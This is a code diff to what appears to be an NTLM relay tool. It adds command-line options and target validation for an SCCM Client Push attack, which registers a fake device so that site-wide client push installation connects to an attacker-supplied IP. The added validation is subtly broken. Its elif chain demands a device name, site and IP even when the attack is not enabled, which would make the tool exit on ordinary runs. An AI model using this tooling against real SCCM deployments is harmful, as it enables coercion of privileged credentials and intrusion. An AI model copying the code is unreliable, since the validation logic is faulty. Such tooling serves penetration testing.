@@ -217,7 +217,9 @@ def start_servers(options, threads):
         c.setIsSCCMDPAttack(options.sccm_dp)
         c.setSCCMPoliciesOptions(options.sccm_policies_clientname, options.sccm_policies_sleep)
         c.setSCCMDPOptions(options.sccm_dp_extensions, options.sccm_dp_files)
-        
+        c.setIsSCCMClientPushAttack(options.sccm_clientpush) 
+        c.setSCCMClientPushOptions(options.sccm_clientpush_devicename, options.sccm_clientpush_site, options.sccm_clientpush_ip, options.sccm_clientpush_sleep)
+
         c.setAltName(options.altname)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
@@ -437,10 +439,19 @@ if __name__ == '__main__':
     sccmpoliciesoptions.add_argument('--sccm-policies-clientname', action='store', required=False, help='The name of the client that will be registered in order to dump secret policies. Defaults to the relayed account\'s name')
     sccmpoliciesoptions.add_argument('--sccm-policies-sleep', action='store', required=False, help='The number of seconds to sleep after the client registration before requesting secret policies')
 
+    # SCCM distributions point options
     sccmdpoptions = parser.add_argument_group("SCCM Distribution Point attack options")
     sccmdpoptions.add_argument('--sccm-dp', action='store_true', required=False, help='Enable SCCM Distribution Point attack. Perform package file dump from an SCCM Distribution Point. Expects as target \'http://<DP>/sms_dp_smspkg$/Datalib\'')
     sccmdpoptions.add_argument('--sccm-dp-extensions', action='store', required=False, help='A custom list of extensions to look for when downloading files from the SCCM Distribution Point. If not provided, defaults to .ps1,.bat,.xml,.txt,.pfx')
     sccmdpoptions.add_argument('--sccm-dp-files', action='store', required=False, help='The path to a file containing a list of specific URLs to download from the Distribution Point, instead of downloading by extensions. Providing this argument will skip file indexing')
+
+    # SCCM client push options
+    sccmclientpushoptions = parser.add_argument_group("SCCM Client Push attack options")
+    sccmclientpushoptions.add_argument('--sccm-clientpush', action='store_true', required=False, help='Enable SCCM Client Push attack. Invokes SCCM client push by registering a fake device. Only works when relaying a machine account. Expects as target \'http://<MP>/ccm_system_windowsauth/request\'')
+    sccmclientpushoptions.add_argument('--sccm-clientpush-devicename', action='store', required=False, help='The name of the fake client that will be registered in order to invoke automatic site-wide client push installation.')
+    sccmclientpushoptions.add_argument('--sccm-clientpush-site', action='store', required=False, help='The target site to include in the SCCM Client Push DDR request.')
+    sccmclientpushoptions.add_argument('--sccm-clientpush-ip', action='store', required=False, help='The IP address the Client Push Installation should connect to.') 
+    sccmclientpushoptions.add_argument('--sccm-clientpush-sleep', action='store', default=3, type=int, required=False, help='The number of seconds to sleep after the client registration before sending the DDR request')
 
     try:
        options = parser.parse_args()
@@ -462,6 +473,21 @@ if __name__ == '__main__':
     if options.sccm_dp is True and not options.target.rstrip('/').endswith("/sms_dp_smspkg$/Datalib"):
         logging.error("When performing SCCM DP attack, the Distribution Point Datalib endpoint should be provided as target")
         logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/sms_dp_smspkg$/Datalib")
+        sys.exit(1)
+
+    # Ensuring the correct parameters are set when performing SCCM Client Push attack
+    if options.sccm_clientpush is True and not options.target.rstrip('/').endswith("/ccm_system_windowsauth/request"):
+        logging.error("When performing SCCM Client Push attack, the Management Point authenticated device registration endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/ccm_system_windowsauth/request")
+        sys.exit(1)
+    elif options.sccm_clientpush_devicename == None:
+        logging.error(f"Error please specify a name for the device to be registered.")
+        sys.exit(1)
+    elif options.sccm_clientpush_site == None:
+        logging.error(f"Error please specify a valid SCCM site.")
+        sys.exit(1)
+    elif options.sccm_clientpush_ip == None:
+        logging.error(f"Error please specify an IP address to which Client Push Installation should be invoked to.")
         sys.exit(1)
 
     # Init the example's logger theme
